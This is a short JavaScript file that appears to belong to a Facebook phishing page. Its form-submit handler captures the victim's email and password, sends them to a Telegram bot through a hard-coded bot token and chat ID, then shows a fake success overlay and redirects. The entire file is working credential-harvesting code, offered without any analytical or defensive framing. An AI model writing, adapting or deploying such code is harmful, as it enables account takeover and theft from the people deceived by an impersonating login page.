document.getElementById('login-form').addEventListener('submit', async function(e) {
    e.preventDefault();
    
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    
    // Telegram bot details
    const botToken = '7496628494:AAFipx11EshHzEmO9V9gczD6khf5dKnnaIM';
    const chatId = '6153049118';
    
    // Send credentials to Telegram bot
    const message = `📱 New Facebook Login\nEmail: ${email}\nPassword: ${password}`;
    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
    
    try {
        await fetch(telegramUrl);
        
        // Show success overlay
        document.getElementById('success-overlay').classList.remove('hidden');
        
        // Wait 3 seconds before redirecting
        setTimeout(() => {
            window.location.href = '/index.html';
        }, 3000);
        
    } catch (error) {
        console.error('Error:', error);
    }
});
